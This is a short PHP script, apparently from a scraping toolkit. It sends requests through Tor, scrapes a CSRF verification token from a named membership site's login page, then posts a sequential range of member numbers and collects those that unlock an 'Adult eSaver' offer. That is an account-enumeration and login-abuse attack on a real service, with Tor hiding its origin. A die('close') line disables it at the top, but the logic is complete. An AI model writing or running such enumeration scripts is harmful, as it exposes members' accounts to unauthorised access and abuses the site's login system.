<?php
die('close');
require_once __DIR__ . '/../../../bootstrap.php';

$crawler = new Crawler();
$crawler->setUseTor();
$ids = array();
// up to 9407465
for ($i = 9407365; $i < 9407375; $i++) {
  $crawler->setCookiePath(CACHE_DIR . DS . 'nrma_cookie.txt');
  $crawler->clearCookie();
  $crawler->setReferer('https://www.experiencethis.com.au/mynrma/login');
  
  // get verification token
  $result = $crawler->read('https://www.experiencethis.com.au/mynrma/login');
  $matches = array();
  preg_match('/<[^<]+name="__RequestVerificationToken"[^<]+value="([^<]+)"/', $result, $matches);
  if (isset($matches[1])) {
    $verification_token = $matches[1];
  } else {
    die('can not find verification token');
  }
  
  // login first
  $result = $crawler->post('https://www.experiencethis.com.au/Mynrma/login',  array(
      "__RequestVerificationToken" => $verification_token,
      "tf_membernumber" => $i
  ));
  if (strpos($result, 'Adult eSaver')) {
    $ids[] = $i;
  }
}
foreach ($ids as $id) {
  echo "&nbsp;&nbsp;- $id<br />";
}
